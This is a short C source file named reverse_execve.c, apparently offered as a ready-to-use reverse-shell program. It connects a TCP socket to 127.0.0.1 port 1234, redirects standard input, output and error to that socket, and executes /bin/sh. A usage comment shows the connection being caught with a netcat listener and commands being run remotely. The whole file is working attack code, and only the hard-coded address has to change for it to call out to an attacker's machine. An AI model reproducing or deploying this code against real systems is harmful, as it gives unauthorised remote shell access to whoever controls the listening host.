#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
/*
usege:
SERVER# gcc -o reverse_execve reverse_execve.c
CLIENT# nc -lv 127.0.0.1 1234
SERVER# ./reverse_execve

Connection from 127.0.0.1 port 1234 [tcp/*] accepted
hostname
SERVER
exit
CLIENT#
*/
int main(){
        char *shell[2];
        int i,sockfd;
        struct sockaddr_in sin;

        sockfd=socket(AF_INET,SOCK_STREAM,0);
        sin.sin_family=AF_INET;
        sin.sin_addr.s_addr=inet_addr("127.0.0.1");
        sin.sin_port=htons(1234);
        connect(sockfd,(struct sockaddr *)&sin,sizeof(struct sockaddr_in));
        for(i=0;i<3;i++){
                dup2(sockfd,i);
        }
        shell[0]="/bin/sh";
        shell[1]=0;
        execve("/bin/sh",shell,NULL);
}
